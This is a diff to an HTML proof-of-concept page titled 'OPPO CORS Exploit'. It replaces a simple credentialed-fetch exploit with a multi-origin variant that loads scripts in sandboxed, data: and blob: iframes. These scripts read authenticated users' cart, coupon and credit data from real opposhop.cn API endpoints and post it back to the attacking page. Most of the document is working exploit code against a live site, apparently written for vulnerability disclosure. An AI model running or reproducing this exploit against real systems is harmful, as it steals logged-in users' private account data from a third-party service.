@@ -3,16 +3,15 @@
 
 <head>
 <meta charset="UTF-8">
-<title>OPPO CORS Exploit PoC</title>
+<title>OPPO CORS Exploit Tests</title>
 
 <style>
 
 body{
-font-family: Arial, sans-serif;
+font-family:Arial;
 background:#eef2f7;
 margin:0;
 padding:30px;
-color:#222;
 }
 
 .container{
@@ -20,23 +19,12 @@ max-width:1100px;
 margin:auto;
 }
 
-h1{
-text-align:center;
-margin-bottom:10px;
-}
-
-.description{
-text-align:center;
-font-size:16px;
-margin-bottom:30px;
-color:#444;
-}
+h1{text-align:center}
 
 button{
 display:block;
-margin:0 auto 30px auto;
+margin:20px auto;
 padding:12px 30px;
-font-size:16px;
 background:#2e7df6;
 color:white;
 border:none;
@@ -44,55 +32,27 @@ border-radius:6px;
 cursor:pointer;
 }
 
-button:hover{
-background:#1c5ed3;
-}
-
-.grid{
-display:grid;
-grid-template-columns:1fr;
-gap:20px;
-}
-
 .card{
 background:white;
-padding:18px;
-border-radius:10px;
-box-shadow:0 2px 8px rgba(0,0,0,0.08);
-}
-
-.label{
-display:inline-block;
-padding:5px 12px;
-border-radius:6px;
-font-size:13px;
-color:white;
-margin-bottom:10px;
-}
-
-.cart{background:#4CAF50;}
-.count{background:#2196F3;}
-.coupon{background:#FF9800;}
-.credit{background:#9C27B0;}
-
-.url{
-font-size:14px;
-color:#555;
-margin-bottom:8px;
-word-break:break-word;
+padding:15px;
+margin-bottom:15px;
+border-radius:8px;
+box-shadow:0 2px 6px rgba(0,0,0,.1);
 }
 
 .status{
 font-weight:bold;
-margin-bottom:8px;
+margin:8px 0;
 }
 
 pre{
-background:#f5f6f8;
+background:#111;
+color:#0f0;
 padding:12px;
 border-radius:6px;
 white-space:pre-wrap;
-font-size:13px;
+word-break:break-word;
+min-height:40px;
 }
 
 </style>
@@ -103,107 +63,145 @@ font-size:13px;
 
 <div class="container">
 
-<h1>OPPO CORS Exploit Proof of Concept</h1>
+<h1>OPPO CORS Exploit Multi-Origin Test</h1>
 
-<div class="description">
-This page demonstrates a CORS misconfiguration allowing authenticated API requests to be executed and read from an external origin.
-</div>
+<button onclick="runTests()">Run Exploit</button>
 
-<button onclick="runExploit()">Run Exploit</button>
-
-<div class="grid" id="results"></div>
+<div id="results"></div>
 
 </div>
+
+<iframe id="sandboxFrame" sandbox="allow-scripts" style="display:none"></iframe>
 
 <script>
 
-function createCard(title,label,url){
+const endpoints={
 
-let card=document.createElement("div")
-card.className="card"
-
-card.innerHTML=
-'<div class="label '+label+'">'+title+'</div>'+
-'<div class="url">'+url+'</div>'+
-'<div class="status" id="'+label+'_status">Waiting...</div>'+
-'<pre id="'+label+'_data"></pre>'
-
-document.getElementById("results").appendChild(card)
+cart:"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
+count:"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+coupon:"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
+credit:"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
 
 }
 
-createCard(
-"Cart List",
-"cart",
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list"
-)
+function createCard(name,method){
 
-createCard(
-"Cart Count",
-"count",
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount"
-)
+let id=method+"_"+name
 
-createCard(
-"Coupon Count",
-"coupon",
-"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1"
-)
+let div=document.createElement("div")
+div.className="card"
 
-createCard(
-"User Credits",
-"credit",
-"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
-)
+div.innerHTML=
+"<b>"+method.toUpperCase()+" → "+name+"</b>"+
+"<div class='status'>Status: <span id='"+id+"_status'>waiting</span></div>"+
+"<pre id='"+id+"_data'>no response yet</pre>"
 
-function request(url,label){
+document.getElementById("results").appendChild(div)
 
-fetch(url,{
-method:"GET",
-credentials:"include"
+}
+
+for(let e in endpoints){
+
+createCard(e,"sandbox")
+createCard(e,"data")
+createCard(e,"blob")
+
+}
+
+window.addEventListener("message",e=>{
+
+let d=e.data
+let id=d.method+"_"+d.endpoint
+
+if(!document.getElementById(id+"_status")) return
+
+document.getElementById(id+"_status").innerText=d.status
+
+let output=d.body
+
+try{
+output=JSON.stringify(JSON.parse(d.body),null,2)
+}catch{}
+
+document.getElementById(id+"_data").innerText=output
+
 })
-.then(response=>{
 
-document.getElementById(label+"_status").innerText="STATUS: "+response.status
+function runTests(){
 
-return response.text()
+runSandbox()
+runData()
+runBlob()
 
-})
-.then(data=>{
+}
 
-document.getElementById(label+"_data").innerText=data
+function buildScript(method){
 
-})
-.catch(error=>{
+return `
+<script>
 
-document.getElementById(label+"_status").innerText="ERROR"
-document.getElementById(label+"_data").innerText=error
+const endpoints=${JSON.stringify(endpoints)}
 
+for(let name in endpoints){
+
+fetch(endpoints[name],{credentials:"include"})
+.then(r=>r.text().then(t=>{
+parent.postMessage({
+method:"${method}",
+endpoint:name,
+status:r.status,
+body:t
+},"*")
+}))
+.catch(e=>{
+parent.postMessage({
+method:"${method}",
+endpoint:name,
+status:"error",
+body:e.toString()
+},"*")
 })
 
 }
 
-function runExploit(){
+<\/script>
+`
 
-request(
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-"cart"
-)
+}
 
-request(
-"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-"count"
-)
+function runSandbox(){
 
-request(
-"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-"coupon"
-)
+document.getElementById("sandboxFrame").srcdoc=buildScript("sandbox")
 
-request(
-"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
-"credit"
-)
+}
+
+function runData(){
+
+let code=buildScript("data")
+
+let url="data:text/html;base64,"+btoa(code)
+
+let iframe=document.createElement("iframe")
+iframe.src=url
+iframe.style.display="none"
+
+document.body.appendChild(iframe)
+
+}
+
+function runBlob(){
+
+let code=buildScript("blob")
+
+let blob=new Blob([code],{type:"text/html"})
+
+let url=URL.createObjectURL(blob)
+
+let iframe=document.createElement("iframe")
+iframe.src=url
+iframe.style.display="none"
+
+document.body.appendChild(iframe)
 
 }
 
